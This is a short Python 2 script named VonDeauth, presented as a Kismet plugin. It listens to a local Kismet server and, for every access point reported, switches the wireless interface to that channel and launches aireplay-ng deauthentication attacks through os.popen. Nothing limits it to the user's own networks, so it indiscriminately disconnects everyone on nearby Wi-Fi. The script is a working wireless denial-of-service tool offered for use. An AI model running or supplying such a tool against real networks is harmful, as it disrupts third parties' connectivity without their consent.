#!/usr/bin/python

import argparse
import os

from kismetclient import Client as KismetClient
from kismetclient import handlers

##### ARGPARSE AREA BEGIN #####
parser = argparse.ArgumentParser(
        description='VonDeauth is a kismet plugin. Automated AccessPoint deauther.')

parser.add_argument('-d', help='Deauth per time for target',
        type=int, default=2)

parser.add_argument('-i', help='Interface for deauth',
        required=True)

args = parser.parse_args()

INTERFACE = args.i
DT        = args.d # Deauth time
##### ARGARSE AREA END #####

##### COLOR AREA BEGIN #####

RED = "\033[31m"
BLUE = "\033[34m"
GREEN = "\033[32m"
WHITE = "\033[0m"

##### COLOR AREA END #####


address = ('127.0.0.1', 2501)

k = KismetClient(address)
k.register_handler('TRACKINFO', handlers.print_fields)


def handle_ssid(client, bssid, manuf, channel, signal_dbm):
    deauth_code = "aireplay-ng -a %s -0 %d %s -D" % (bssid, DT, INTERFACE)
    channel_code = "iwconfig " + INTERFACE + " channel " + channel
    if channel != "0":
        os.popen(channel_code)
        print BLUE + 'Deauth request sending. MAC:', WHITE + bssid, signal_dbm
        os.popen(deauth_code)


k.register_handler('BSSID', handle_ssid)

try:
    while True:
        k.listen()
except Exception as err:
    print RED + err + WHITE
    
